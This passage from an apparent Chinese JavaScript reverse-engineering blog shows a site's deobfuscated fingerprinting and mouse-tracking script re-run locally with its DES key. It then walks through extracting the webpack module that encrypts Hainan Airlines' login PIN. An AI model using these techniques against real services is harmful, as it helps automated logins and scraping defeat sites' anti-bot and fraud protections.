(e.<span class="property">length</span> === +e.<span class="property">length</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, o = e.<span class="property">length</span>; o &gt; i; i++)</span><br><span class="line">                    <span class="keyword">if</span> (r.<span class="title function_">call</span>(n, e[i], i, e) === &#123;&#125;)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> e)</span><br><span class="line">                    <span class="keyword">if</span> (e.<span class="title function_">hasOwnProperty</span>(a) &amp;&amp; r.<span class="title function_">call</span>(n, e[a], a, e) === &#123;&#125;)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span> = <span class="keyword">function</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span> == e ? i : r &amp;&amp; e.<span class="property">map</span> === r ? e.<span class="title function_">map</span>(t, n) : (<span class="variable language_">this</span>.<span class="title function_">each</span>(e, <span class="keyword">function</span>(<span class="params">e, r, o</span>) &#123;</span><br><span class="line">            i[i.<span class="property">length</span>] = t.<span class="title function_">call</span>(n, e, r, o)</span><br><span class="line">        &#125;),</span><br><span class="line">        i)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> e ? (<span class="variable language_">this</span>.<span class="property">hasher</span> = e.<span class="property">hasher</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">screen_resolution</span> = e.<span class="property">screen_resolution</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">canvas</span> = e.<span class="property">canvas</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ie_activex</span> = e.<span class="property">ie_activex</span>) : <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; (<span class="variable language_">this</span>.<span class="property">hasher</span> = e)</span><br><span class="line">&#125;;</span><br><span class="line">referFingerprint.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = [];</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="title function_">push</span>(navigator.<span class="property">userAgent</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">language</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(screen.<span class="property">colorDepth</span>),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screen_resolution</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">getScreenResolution</span>();</span><br><span class="line">            <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> t &amp;&amp; e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getScreenResolution</span>().<span class="title function_">join</span>(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">push</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTimezoneOffset</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">hasSessionStorage</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">hasLocalStorage</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(!!<span class="variable language_">window</span>.<span class="property">indexedDB</span>),</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span> ? e.<span class="title function_">push</span>(<span class="keyword">typeof</span> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">addBehavior</span>) : e.<span class="title function_">push</span>(<span class="string">&quot;undefined&quot;</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="keyword">typeof</span> <span class="variable language_">window</span>.<span class="property">openDatabase</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">cpuClass</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">platform</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">doNotTrack</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getPluginsString</span>()),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">canvas</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">isCanvasSupported</span>() &amp;&amp; e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getCanvasFingerprint</span>()),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hasher</span> ? <span class="variable language_">this</span>.<span class="title function_">hasher</span>(e.<span class="title function_">join</span>(<span class="string">&quot;###&quot;</span>), <span class="number">31</span>) : <span class="variable language_">this</span>.<span class="title function_">murmurhash3_32_gc</span>(e.<span class="title function_">join</span>(<span class="string">&quot;###&quot;</span>), <span class="number">31</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">murmurhash3_32_gc</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r, n, i, o, a, s, c, l;</span><br><span class="line">        <span class="keyword">for</span> (r = <span class="number">3</span> &amp; e.<span class="property">length</span>,</span><br><span class="line">        n = e.<span class="property">length</span> - r,</span><br><span class="line">        i = t,</span><br><span class="line">        a = <span class="number">3432918353</span>,</span><br><span class="line">        s = <span class="number">461845907</span>,</span><br><span class="line">        l = <span class="number">0</span>; n &gt; l; )</span><br><span class="line">            c = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l) | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">8</span> | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">16</span> | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">24</span>,</span><br><span class="line">            ++l,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * a + (((c &gt;&gt;&gt; <span class="number">16</span>) * a &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            c = c &lt;&lt; <span class="number">15</span> | c &gt;&gt;&gt; <span class="number">17</span>,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * s + (((c &gt;&gt;&gt; <span class="number">16</span>) * s &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i ^= c,</span><br><span class="line">            i = i &lt;&lt; <span class="number">13</span> | i &gt;&gt;&gt; <span class="number">19</span>,</span><br><span class="line">            o = <span class="number">5</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">5</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i = (<span class="number">65535</span> &amp; o) + <span class="number">27492</span> + (((o &gt;&gt;&gt; <span class="number">16</span>) + <span class="number">58964</span> &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">switch</span> (c = <span class="number">0</span>,</span><br><span class="line">        r) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            c ^= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l + <span class="number">2</span>)) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            c ^= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l + <span class="number">1</span>)) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            c ^= <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l),</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * a + (((c &gt;&gt;&gt; <span class="number">16</span>) * a &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            c = c &lt;&lt; <span class="number">15</span> | c &gt;&gt;&gt; <span class="number">17</span>,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * s + (((c &gt;&gt;&gt; <span class="number">16</span>) * s &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i ^= c</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i ^= e.<span class="property">length</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        i = <span class="number">2246822507</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">2246822507</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">13</span>,</span><br><span class="line">        i = <span class="number">3266489909</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">3266489909</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        i &gt;&gt;&gt; <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hasLocalStorage</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> !!<span class="variable language_">window</span>.<span class="property">localStorage</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hasSessionStorage</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> !!<span class="variable language_">window</span>.<span class="property">sessionStorage</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">isCanvasSupported</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> !(!e.<span class="property">getContext</span> || !e.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">isIE</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Microsoft Internet Explorer&quot;</span> === navigator.<span class="property">appName</span> ? !<span class="number">0</span> : !(<span class="string">&quot;Netscape&quot;</span> !== navigator.<span class="property">appName</span> || !<span class="regexp">/Trident/</span>.<span class="title function_">test</span>(navigator.<span class="property">userAgent</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">isIE</span>() &amp;&amp; <span class="variable language_">this</span>.<span class="property">ie_activex</span> ? <span class="variable language_">this</span>.<span class="title function_">getIEPluginsString</span>() : <span class="variable language_">this</span>.<span class="title function_">getRegularPluginsString</span>()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getRegularPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">map</span>(navigator.<span class="property">plugins</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">map</span>(e, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> [e.<span class="property">type</span>, e.<span class="property">suffixes</span>].<span class="title function_">join</span>(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">            &#125;).<span class="title function_">join</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> [e.<span class="property">name</span>, e.<span class="property">description</span>, t].<span class="title function_">join</span>(<span class="string">&quot;::&quot;</span>)</span><br><span class="line">        &#125;, <span class="variable language_">this</span>).<span class="title function_">join</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getIEPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = [<span class="string">&quot;ShockwaveFlash.ShockwaveFlash&quot;</span>, <span class="string">&quot;AcroPDF.PDF&quot;</span>, <span class="string">&quot;PDF.PdfCtrl&quot;</span>, <span class="string">&quot;QuickTime.QuickTime&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control.1&quot;</span>, <span class="string">&quot;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealVideo.RealVideo(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealPlayer&quot;</span>, <span class="string">&quot;SWCtl.SWCtl&quot;</span>, <span class="string">&quot;WMPlayer.OCX&quot;</span>, <span class="string">&quot;AgControl.AgControl&quot;</span>, <span class="string">&quot;Skype.Detection&quot;</span>];</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">map</span>(e, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(e),</span><br><span class="line">                    e</span><br><span class="line">                &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).<span class="title function_">join</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getScreenResolution</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [screen.<span class="property">height</span>, screen.<span class="property">width</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getCanvasFingerprint</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>)</span><br><span class="line">          , t = e.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>)</span><br><span class="line">          , r = <span class="string">&quot;http://valve.github.io&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> t.<span class="property">textBaseline</span> = <span class="string">&quot;top&quot;</span>,</span><br><span class="line">        t.<span class="property">font</span> = <span class="string">&quot;14px &#x27;Arial&#x27;&quot;</span>,</span><br><span class="line">        t.<span class="property">textBaseline</span> = <span class="string">&quot;alphabetic&quot;</span>,</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;#f60&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillRect</span>(<span class="number">125</span>, <span class="number">1</span>, <span class="number">62</span>, <span class="number">20</span>),</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;#069&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillText</span>(r, <span class="number">2</span>, <span class="number">15</span>),</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(102, 204, 0, 0.7)&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillText</span>(r, <span class="number">4</span>, <span class="number">17</span>),</span><br><span class="line">        e.<span class="title function_">toDataURL</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yexsuom_xee\\&quot;</span>, <span class="number">7</span>, <span class="number">2</span>)] = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> e &amp;&amp; (<span class="variable language_">this</span>.<span class="title function_">push</span>(e),</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">length</span> &gt; <span class="number">5</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">shift</span>())</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;obj&quot;</span></span><br><span class="line">  , m = <span class="string">&quot;000215455&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress,</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = keydown,</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">mcArrs</span> = [],</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">mcArrps</span> = [];</span><br><span class="line"><span class="keyword">var</span> fingerprint = (<span class="keyword">new</span> referFingerprint).<span class="title function_">get</span>();</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKroleD&quot;</span>, <span class="number">3</span>, <span class="number">3</span>)] = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    mcArrs.<span class="title function_">ex_mouse</span>(e);</span><br><span class="line">    <span class="keyword">var</span> t = &#123;</span><br><span class="line">        <span class="attr">xy</span>: mcArrs,</span><br><span class="line">        <span class="attr">fingerprint</span>: fingerprint</span><br><span class="line">    &#125;</span><br><span class="line">      , r = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t)</span><br><span class="line">      , n = <span class="title function_">eq_u</span>(r, <span class="title function_">zznu</span>(zre));</span><br><span class="line">    <span class="variable language_">window</span>[coyp](<span class="title function_">_hqjl</span>(<span class="string">&quot;ycrtrehpixext\\&quot;</span>, <span class="number">7</span>, <span class="number">2</span>) + <span class="string">&quot;=&#x27;&quot;</span> + n + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">var</span> mc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    jQuery &amp;&amp; jQuery.<span class="property">mouseCollection</span>.<span class="title function_">record</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e.<span class="property">currentPoint</span>);</span><br><span class="line">        <span class="title function_">zlo</span>(t)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">  , c = <span class="string">&quot;test&quot;</span></span><br><span class="line">  , _maq = _maq || [];</span><br><span class="line">_maq.<span class="title function_">push</span>([<span class="string">&quot;_setAccount&quot;</span>, <span class="string">&quot;AIRJDWEBBJ&quot;</span>]),</span><br><span class="line">_maq.<span class="title function_">push</span>([<span class="string">&quot;_setHnaUserId&quot;</span>, <span class="string">&quot;&quot;</span>]),</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yzxolx\\&quot;</span>, <span class="number">3</span>, <span class="number">2</span>)]()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e = <span class="string">&#x27;&#123;&quot;xy&quot;:[],&quot;fingerprint&quot;:2883398340&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> t = <span class="string">&#x27;52D2841A3485DFFBCF2EA6A0515077CD&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">eq_u</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = coypJsDk.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(t)</span><br><span class="line">      , n = coypJsDk.<span class="property">DES</span>.<span class="title function_">encrypt</span>(e, r, &#123;</span><br><span class="line">        <span class="attr">mode</span>: coypJsDk.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: coypJsDk.<span class="property">pad</span>.<span class="property">Nopk</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">del_html_tags</span>(n.<span class="title function_">toString</span>(), <span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%2B&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">eq_u</span>(e, t))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> 补环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海南航空登录逆向webpack</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BA%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91webpack/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BA%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91webpack/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：海南航空登录逆向webpack</li><li>链接：<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>简介：逆向登录密码password（webpack加密）</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101615362.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><h2 id="1、定位加密位置"><a href="#1、定位加密位置" class="headerlink" title="1、定位加密位置"></a>1、定位加密位置</h2><p>打XHR断点，向上跟栈，找到pin密码字段加密处：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101618868.png" alt="image.png"> </p><p>也可以全局搜索关键字 “pin” 定位到函数所在的位置</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101619915.png" alt="image.png"> </p><h2 id="2、逆向加密函数encryptedString"><a href="#2、逆向加密函数encryptedString" class="headerlink" title="2、逆向加密函数encryptedString"></a>2、逆向加密函数encryptedString</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pin: i.default.encryptedString(t)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encryptedString: function(e) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    var t = e;</span><br><span class="line">                    (new Date).getTime();</span><br><span class="line">                    return t = window.isNative ? _.default.encryptedString(e) : m.default.encryptedString(e),</span><br><span class="line">                    (new Date).getTime(),</span><br><span class="line">                    t</span><br><span class="line">                &#125; catch (t) &#123;</span><br><span class="line">                    return e</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>向上翻，可以明显看到是webpack！！！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101619161.png" alt="image.png"> </p><h2 id="3、webpack扣取代码"><a href="#3、webpack扣取代码" class="headerlink" title="3、webpack扣取代码"></a>3、webpack扣取代码</h2><h3 id="1）找到webpack启动器"><a href="#1）找到webpack启动器" class="headerlink" title="1）找到webpack启动器"></a>1）找到webpack启动器</h3><p>首先，可以看到最终的加密代码为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return t = window.isNative ? _.default.encryptedString(e) : m.default.encryptedString(e),</span><br></pre></td></tr></table></figure><p>这块是一个三目表达式，可以就看到真正加密函数为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m.default.encryptedString(e)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101620298.png" alt="image.png"> </p><p>这块的对象是 “m” ，向上查找，成功定位到定义 “m” 的位置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = E(n(87377))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101621743.png" alt="image.png"> </p><p>刚好掉下是定义了函数 E 的位置，所以，这块的加载器，肯定还是 n，所以在这块打断点，刷新页面：</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101621520.png" alt="image.png"></p><p>断点，断下后，找到了启动器的位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101622270.png" alt="image.png"> </p><p>简单改写一下启动器，改写后代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//模块</span></span><br><span class="line">  <span class="number">1</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)&#125;,</span><br><span class="line">  <span class="number">2</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101622158.png" alt="image.png"> </p><h3 id="2）导进加密模块"><a href="#2）导进加密模块" class="headerlink" title="2）导进加密模块"></a>2）导进加密模块</h3><p>根据前面分析，得到这块最先导进的是 “87377” 模块。可以按照顺序先进行导入：</p><p>加密函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m.default.encryptedString(e)</span><br></pre></td></tr></table></figure><p>定义m：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = E(n(87377))</span><br></pre></td></tr></table></figure><p>导入后，发现其实也只需要这一个模块就够了！！！</p><h3 id="3）自定义加密函数"><a href="#3）自定义加密函数" class="headerlink" title="3）自定义加密函数"></a>3）自定义加密函数</h3><p>其实这块也不用特意写，就按照原本代码中的加密，稍微改写一下就行：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;87377&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encryptedString</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = e;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">return</span> t = p.<span class="property">default</span>.<span class="title function_">encryptedString</span>(e),</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>(),</span><br><span class="line">      t</span><br><span class="line">  &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">  &#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p>代码写好后，运行，成功加密：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101632739.png" alt="image.png"> </p><h1 id="三、完整代码"><a 